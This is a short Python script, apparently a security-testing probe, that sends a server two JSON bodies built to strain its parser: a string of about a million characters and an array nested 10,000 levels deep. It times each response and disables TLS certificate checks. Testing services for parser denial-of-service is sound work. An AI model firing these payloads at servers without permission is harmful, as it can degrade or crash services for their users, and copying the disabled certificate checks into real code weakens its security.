import requests
import json
import time

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


import argparse

parser = argparse.ArgumentParser(description='Send a large JSON body to a server')
parser.add_argument('--url', required=True, help='URL to send the request to')
parser.add_argument('--p1len', required=False, help='Length of the first payload', default=1000000)
parser.add_argument('--p2len', required=False, help='Length of the second payload', default=10000)
args = parser.parse_args()

payload_1 = '{"a":"'+'a' * int(args.p1len) + '"}'
payload_2 = '{"a":' + '[' * int(args.p2len) + '1' + ']' * int(args.p2len) + '}'

print("\nSending payload 1 of length", len(payload_1))
start_time = time.time()
resp = requests.post(
    args.url, 
    data=payload_1,
    headers={
        'Content-Type': 'application/json',
        "user-agent": "karna",
        "accept": "*/*"
    },
    verify=False
)
end_time = time.time()
print("Response:", resp.status_code)
print("Time taken:", end_time - start_time, "\n")

print("Sending payload 2 of length", len(payload_2))
start_time = time.time()
resp = requests.post(
    args.url, 
    data=payload_2,
    headers={
        'Content-Type': 'application/json',
        "user-agent": "karna",
        "accept": "*/*"
    },
    verify=False
)
end_time = time.time()
print("Response:", resp.status_code)
print("Time taken:", end_time - start_time, "\n")




